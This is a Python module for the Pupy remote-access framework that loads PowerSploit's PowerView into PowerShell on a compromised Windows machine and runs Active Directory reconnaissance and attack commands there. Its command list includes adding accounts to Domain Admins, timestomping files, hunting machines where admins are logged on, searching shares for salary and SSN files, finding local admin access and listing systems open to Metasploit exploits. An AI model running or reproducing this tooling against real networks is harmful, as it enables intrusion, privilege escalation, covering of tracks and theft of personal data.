# -*- coding: utf-8 -*-

import os

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib import ROOT

__class_name__="Powerview"

@config(compat="windows", category="gather")
class Powerview(PupyModule):
    """
        execute powerview commands
    """
    dependencies = {
        'windows': ['powershell']
    }


    @classmethod
    def init_argparse(cls):

        cls.commands_available = '''
Commandes available:\n
Set-MacAttribute -FilePath c:\\test\\newfile -OldFilePath c:\\test\\oldfile
Set-MacAttribute -FilePath c:\\demo\\test.xt -All "01/03/2006 12:12 pm"
Set-MacAttribute -FilePath c:\\demo\\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"
Copy-ClonedFile -SourceFile program.exe -DestFile \\\\WINDOWS7\\tools\\program.exe
Get-IPAddress -ComputerName SERVER
Convert-NameToSid 'DEV\\dfm'
Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105
Convert-NT4toCanonical -ObjectName "dev\\dfm"
ConvertFrom-UACValue -Value 66176
Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue
Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll
Get-Proxy
Get-DomainSearcher -Domain testlab.local
Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
Get-NetDomain -Domain testlab.local
Get-NetForest -Forest external.domain
Get-NetForestDomain
Get-NetForestDomain -Forest external.local
Get-NetForestCatalog
Get-NetDomainController -Domain test
Get-NetUser -Domain testing
Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
Add-NetUser -UserName john -Password 'Password123!'
Add-NetUser -UserName john -Password 'Password123!' -ComputerName server.testlab.local
Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain ''
Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain 'testing'
Add-NetGroupUser -UserName john -GroupName Administrators
Add-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local
Get-UserProperty -Domain testing
Get-UserProperty -Properties ssn,lastlogon,location
Find-UserField -SearchField info -SearchTerm backup
Get-UserEvent -ComputerName DomainController.testlab.local
Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local
Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv
Get-NetComputer
Get-NetComputer -SPN mssql*
Get-NetComputer -Domain testing
Get-NetComputer -Domain testing -FullData
Get-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"
Get-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"
Set-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0
Set-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536
Get-ComputerProperty -Domain testing
Get-ComputerProperty -Properties ssn,lastlogon,location
Find-ComputerField -SearchTerm backup -SearchField info
Get-NetOU
Get-NetOU -OUName *admin* -Domain testlab.local
Get-NetOU -GUID 123-...
Get-NetSite -Domain testlab.local -FullData
Get-NetSubnet
Get-NetSubnet -Domain testlab.local -FullData
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -Domain testing -FullData
Get-NetGroupMember
Get-NetGroupMember -Domain testing -GroupName "Power Users"
Get-NetFileServer
Get-NetFileServer -Domain testing
Get-DFSshare
Get-DFSshare -Domain test
Get-GptTmpl -GptTmplPath "\\\\dev.testlab.local\\sysvol\\dev.testlab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf"
Get-NetGPO -Domain testlab.local
Get-NetGPOGroup
Find-GPOLocation -UserName dfm
Find-GPOLocation -UserName dfm -Domain dev.testlab.local
Find-GPOLocation -UserName jason -LocalGroup RDP
Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local
Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP
Get-NetGPO
Get-NetLocalGroup
Get-NetLocalGroup -ComputerName WINDOWSXP
Get-NetLocalGroup -ComputerName WINDOWS7 -Resurse
Get-NetLocalGroup -ComputerName WINDOWS7 -ListGroups
Get-NetShare
Get-NetShare -ComputerName sqlserver
Get-NetLoggedon
Get-NetLoggedon -ComputerName sqlserver
Get-NetSession
Get-NetSession -ComputerName sqlserver
Get-NetRDPSession
Get-NetRDPSession -ComputerName "sqlserver"
Invoke-CheckLocalAdminAccess -ComputerName sqlserver
Get-LastLoggedOn
Get-LastLoggedOn -ComputerName WINDOWS1
Get-CachedRDPConnection
Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local
Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local -RemoteUserName DOMAIN\\user -RemotePassword Password123!
Get-NetProcess -ComputerName WINDOWS1
Find-InterestingFile -Path C:\\Backup\\
Find-InterestingFile -Path \\\\WINDOWS7\\Users\\ -Terms salaries,email -OutFile out.csv
Find-InterestingFile -Path \\\\WINDOWS7\\Users\\ -LastAccessTime (Get-Date).AddDays(-7)
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Domain 'testing'
Invoke-UserHunter -Threads 20
Invoke-UserHunter -UserFile users.txt -ComputerFile hosts.txt
Invoke-UserHunter -GroupName "Power Users" -Delay 60
Invoke-UserHunter -TargetServer FILESERVER
Invoke-UserHunter -SearchForest
Invoke-UserHunter -Stealth
Invoke-ProcessHunter -Domain 'testing'
Invoke-ProcessHunter -Threads 20
Invoke-ProcessHunter -UserFile users.txt -ComputerFile hosts.txt
Invoke-ProcessHunter -GroupName "Power Users" -Delay 60
Invoke-EventHunter
Invoke-ShareFinder -ExcludeStandard
Invoke-ShareFinder -Threads 20
Invoke-ShareFinder -Delay 60
Invoke-ShareFinder -ComputerFile hosts.txt
Invoke-FileFinder
Invoke-FileFinder -Domain testing
Invoke-FileFinder -IncludeC
Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv
Find-LocalAdminAccess
Find-LocalAdminAccess -Threads 10
Find-LocalAdminAccess -Domain testing
Find-LocalAdminAccess -ComputerFile hosts.txt
Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\\user | Format-Table -AutoSize
Get-ExploitableSystem | Export-Csv c:\\temp\\output.csv -NoTypeInformation
Get-ExploitableSystem -Domain testlab.local -Ping
Invoke-EnumerateLocalAdmin
Invoke-EnumerateLocalAdmin -Threads 10
Get-NetDomainTrust
Get-NetDomainTrust -Domain "prod.testlab.local"
Get-NetDomainTrust -Domain "prod.testlab.local" -DomainController "PRIMARY.testlab.local"
Get-NetForestTrust
Get-NetForestTrust -Forest "test"
Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv
'''
        cls.arg_parser = PupyArgumentParser(prog="Powerview", description=cls.__doc__)
        cls.arg_parser.add_argument("-o", metavar='COMMAND', dest='command')
        cls.arg_parser.add_argument("-1", '--once', action='store_true', help='Unload after execution')
        cls.arg_parser.add_argument("-l", "--list-available-commands", action='store_true', help="list all available commands")

        cls.arg_parser.add_argument("--Get-Proxy", dest='GetProxy', action='store_true', help='Returns proxy configuration')
        cls.arg_parser.add_argument("--Get-NetComputer", dest='GetNetComputer', action='store_true', help='Returns the current computers in current domain')
        cls.arg_parser.add_argument("--Get-NetMssql", dest='GetNetMssql', action='store_true', help="Returns all MS SQL servers on the domain")
        cls.arg_parser.add_argument("--Get-NetSubnet", dest='GetNetSubnet', action='store_true', help="Returns all subnet names in the current domain")
        cls.arg_parser.add_argument("--Get-NetGroup", dest='GetNetGroup', action='store_true', help="Returns the current groups in the domain")
        cls.arg_parser.add_argument("--Get-NetGroup-with", dest='GetNetGroupWith', help="Returns all groups with '*GROUPNAME*' in their group name")
        cls.arg_parser.add_argument("--Get-NetGroupMember", dest='GetNetGroupMember', action='store_true', help="Returns the usernames that of members of the 'Domain Admins' domain group")
        cls.arg_parser.add_argument("--Get-NetFileServer", dest='GetNetFileServer', action='store_true', help="Returns active file servers")
        cls.arg_parser.add_argument("--Get-DFSshare", dest='GetDFSshare', action='store_true', help="Returns all distributed file system shares for the current domain")
        cls.arg_parser.add_argument("--Get-NetGPO", dest='GetNetGPO', action='store_true', help="Returns the GPOs in domain")
        cls.arg_parser.add_argument("--Get-NetGPOGroup", dest='GetNetGPOGroup', action='store_true', help="Returns all GPOs that set local groups on the current domain")
        cls.arg_parser.add_argument("--Find-GPOLocation", dest='FindGPOLocation', help="Find all computers that this user has local administrator rights to in the current domain")
        cls.arg_parser.add_argument("--Get-NetLocalGroup", dest='GetNetLocalGroup', action='store_true', help="Returns the usernames that of members of localgroup 'Administrators' on the local host")
        cls.arg_parser.add_argument("--Get-NetLoggedon", dest='GetNetLoggedon', action='store_true', help="Returns users actively logged onto the local host")
        cls.arg_parser.add_argument("--Get-NetLoggedon-on", dest='GetNetLoggedonOn', help="Returns users actively logged onto this remote host")
        cls.arg_parser.add_argument("--Get-NetSession", dest='GetNetSession', action='store_true', help="Returns active sessions on the local host")
        cls.arg_parser.add_argument("--Get-NetSession-on", dest='GetNetSessionOn', help="Returns active sessions on this remote host")
        cls.arg_parser.add_argument("--Get-NetRDPSession", dest='GetNetRDPSession', action='store_true', help="Returns active RDP/terminal sessions on the local host")
        cls.arg_parser.add_argument("--Get-NetRDPSession-on", dest='GetNetRDPSessionOn', help="Returns active RDP/terminal sessions on this remote host")
        cls.arg_parser.add_argument("--Get-LastLoggedOn", dest='GetLastLoggedOn', action='store_true', help="Returns the last user logged onto the local machine")
        cls.arg_parser.add_argument("--Get-LastLoggedOn-on", dest='GetLastLoggedOnOn', help="Returns the last user logged onto this remote machine")
        cls.arg_parser.add_argument("--Invoke-UserHunter-check", dest='InvokeUserHunterCheck', action='store_true', help="Finds machines on the local domain where domain admins are logged into and checks if the current user has local administrator access")
        cls.arg_parser.add_argument("--Invoke-UserHunter-forest", dest='InvokeUserHunterForest', action='store_true', help="Find all machines in the current forest where domain admins are logged in")
        cls.arg_parser.add_argument("--Get-ExploitableSystem", dest='GetExploitableSystem', action='store_true', help="Query Active Directory for the hostname, OS version, and service pack level for each computer account (cross-referenced against a list of common Metasploit exploits)")

    def run(self, args):
        script = 'powerview'
        command = ""
        if args.list_available_commands:
            self.log(self.commands_available)
            return

        powershell = self.client.conn.modules['powershell']

        if not powershell.loaded(script):
            with open(os.path.join(ROOT, 'external', 'PowerSploit', 'Recon', 'PowerView.ps1'), 'r') as content:
                width, _ = self.iogroup.consize
                powershell.load(script, content.read(), width=width)

        if args.GetProxy:
            command = "Get-Proxy"
        if args.GetNetComputer:
            command = "Get-NetComputer"
        elif args.GetNetMssql:
            command = "Get-NetComputer -SPN mssql*"
        elif args.GetNetSubnet:
            command = "Get-NetSubnet"
        elif args.GetNetGroup:
            command = "Get-NetGroup"
        elif args.GetNetGroupWith is not None:
            command = "Get-NetGroup -GroupName *{0}* -FullData".format(args.GetNetGroupWith)
        elif args.GetNetGroupMember:
            command = "Get-NetGroupMember"
        elif args.GetNetFileServer:
            command = "Get-NetFileServer"
        elif args.GetDFSshare:
            command = "Get-DFSshare"
        elif args.GetNetGPO:
            command = "Get-NetGPO"
        elif args.GetNetGPOGroup:
            command = "Get-NetGPOGroup"
        elif args.FindGPOLocation is not None:
            command = "Find-GPOLocation -UserName {0}".format(args.FindGPOLocation)
        elif args.GetNetLocalGroup:
            command = "Get-NetLocalGroup"
        elif args.GetNetLoggedon:
            command = "Get-NetLoggedon"
        elif args.GetNetLoggedonOn is not None:
            command = "Get-NetLoggedon -ComputerName {0}".format(args.GetNetLoggedonOn)
        elif args.GetNetSession:
            command = "Get-NetSession"
        elif args.GetNetSessionOn is not None:
            command = "Get-NetSession -ComputerName {0}".format(args.GetNetSessionOn)
        elif args.GetNetRDPSession:
            command = "Get-NetRDPSession"
        elif args.GetNetRDPSessionOn is not None:
            command = "Get-NetRDPSession -ComputerName {0}".format(args.GetNetRDPSessionOn)
        elif args.GetLastLoggedOn:
            command = "Get-LastLoggedOn"
        elif args.GetLastLoggedOnOn is not None:
            command = "Get-LastLoggedOn -ComputerName {0}".format(args.GetLastLoggedOnOn)
        elif args.InvokeUserHunterCheck:
            command = "Invoke-UserHunter -CheckAccess"
        elif args.InvokeUserHunterForest:
            command = "Invoke-UserHunter -SearchForest"
        elif args.GetExploitableSystem:
            command = "Get-ExploitableSystem  | Format-Table -AutoSize"
        if command == "":
            if args.command is None:
                self.error("You have to choose a powerview command!")
                return
            else:
                command = args.command

        self.log("Executing the following powerview command: {}".format(command))
        output, rest = powershell.call(script, command)
        if args.once:
            powershell.unload(script)

        if not output and not rest:
            self.error("No results")
            return
        else:
            if rest:
                self.error(rest)
            if output:
                self.log(output)
